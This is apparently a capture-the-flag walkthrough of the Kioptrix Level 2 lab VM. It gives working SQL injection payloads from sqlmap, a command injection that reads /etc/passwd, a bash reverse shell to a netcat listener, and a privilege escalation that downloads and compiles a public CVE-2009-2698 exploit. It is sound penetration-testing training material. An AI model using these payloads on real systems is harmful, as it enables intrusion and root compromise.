# Kioptrix Level 2

Once I found my vm at 192.168.1.100 I began doing some information gathering.

I ran ```nmap -sV 192.168.1.100``` to get some information about the service

I then saw some different services were running since the first Kioptrix. 

The main ones that stuck out to me were Cups 1.1 and mysql.

I looked around to see if there was anything special about these services.

I ended up just looking at the webserver. I was greeted by a friendly login page.

![alt text](https://github.com/wdahlenburg/writeups/blob/master/vulnhub/Kioptrix:%20Level%201.1%20(%232)/images/FirstPage.png "First Page")

I whipped out sqlmap and let it do it's thing.

~~~
$ sqlmap -u http://192.168.1.100/index.php --data="uname=admin&psw=123" --risk 3 --level 5

...
POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 385 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=-5376' OR 6294=6294-- efYv&psw=123

    Type: AND/OR time-based blind
    Title: MySQL <= 5.0.11 AND time-based blind (heavy query)
    Payload: uname=admin' AND 3817=BENCHMARK(5000000,MD5(0x416c7946))-- XQoS&psw=123
---
[12:29:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 4.9
web application technology: PHP 4.3.9, Apache 2.0.52
back-end DBMS: MySQL <= 5.0.11
~~~

I entered the payload into the webpage and I was at the next page. 

![alt text](https://github.com/wdahlenburg/writeups/blob/master/vulnhub/Kioptrix:%20Level%201.1%20(%232)/images/SecondPage.png "Second Page")

This page let me ping a server. This reminded me a lot of the DVWA that I did a few years ago.

I went ahead and sent a ping to my computer and tried to see if I could access /etc/passwd while I was at it.

~~~
192.168.1.50; cat /etc/passwd
~~~

I had a ton of output and the bottom half looked exactly like /etc/passwd would so success we have command injection.

I then opened up a listener on my machine.

```nc -nvlp 4444```

Then on the website I entered

~~~
192.168.1.50; bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
~~~

I checked my command prompt and we had a connection. Woohoo.

Running whoami gave us the user apache. Not quite there.

I looked at root services and didn't find anything I knew how to exploit so I did a lot of googling looking for something to use.

I ended with https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/blob/master/2009/CVE-2009-2698/CVE-2009-2698.c

~~~
$ cd /tmp/

$ wget --no-check-certificate https://raw.githubusercontent.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/master/2009/CVE-2009-2698/CVE-2009-2698.c

$ gcc -o exploit CVE-2009-2698.c

$ ./exploit

$ whoami
root
~~~


